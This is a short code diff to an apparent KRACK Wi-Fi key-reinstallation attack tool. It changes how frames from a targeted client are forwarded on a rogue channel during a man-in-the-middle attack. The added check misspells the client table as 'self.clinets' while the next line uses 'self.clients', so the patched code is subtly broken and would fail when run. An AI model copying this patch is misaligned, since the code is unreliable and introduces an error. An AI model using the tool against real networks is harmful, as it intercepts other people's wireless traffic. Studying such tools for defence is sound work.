@@ -481,8 +481,11 @@ class KRAckAttack():
 				will_forward = True
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
-				client = self.clients[p.addr2]
-				will_forward = client.should_forward(p, args.group)
+				if p.addr2 in self.clinets:
+					client = self.clients[p.addr2]
+					will_forward = client.should_forward(p, args.group)
+				else: 
+					will_forward = False
 				if (will_forward):
 					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
 				else:
